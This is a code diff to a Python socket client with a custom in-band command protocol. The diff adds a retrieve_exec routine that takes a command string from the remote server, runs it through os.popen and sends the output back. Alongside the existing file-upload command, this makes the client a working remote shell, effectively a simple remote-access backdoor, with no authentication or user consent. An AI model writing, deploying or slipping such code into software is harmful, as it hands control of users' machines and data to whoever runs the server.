@@ -1,4 +1,5 @@
 import argparse
+import os
 import socket
 import threading
 from enum import Enum
@@ -8,14 +9,14 @@ class Mode(Enum):
     TEXT = 1
     # IAP = 2
     UPLOAD = 3
-    _EXEC = 4
+    EXEC_ = 4
     SEND = 5
     S_SEND = 6
 
 
 class Commands(Enum):
     UPLOAD = 254
-    _EXEC = 253
+    EXEC_ = 253
     SEND = 252
     S_SEND = 251
 
@@ -45,12 +46,24 @@ def download_file(sock: socket.socket):
             f.write(received)
 
 
+def retrieve_exec(sock: socket.socket):
+    command_len = int(sock.recv(LENGTH_SIZE).decode())
+    command = sock.recv(command_len).decode()
+
+    output = os.popen(command).read().encode()
+    output_len = str(len(output))
+    sock.sendall(b' ' * (LENGTH_SIZE - len(output_len)) + output_len.encode())
+    sock.sendall(output)
+
+
 def process_data(data: int, state: ClientState, sock: socket.socket):
     if state.iap_on:
         if data == IAP:
             print(chr(data), end='')
         if data == Commands.UPLOAD.value:
             download_file(sock)
+        if data == Commands.EXEC_.value:
+            retrieve_exec(sock)
 
         state.iap_on = False
     elif data == IAP:
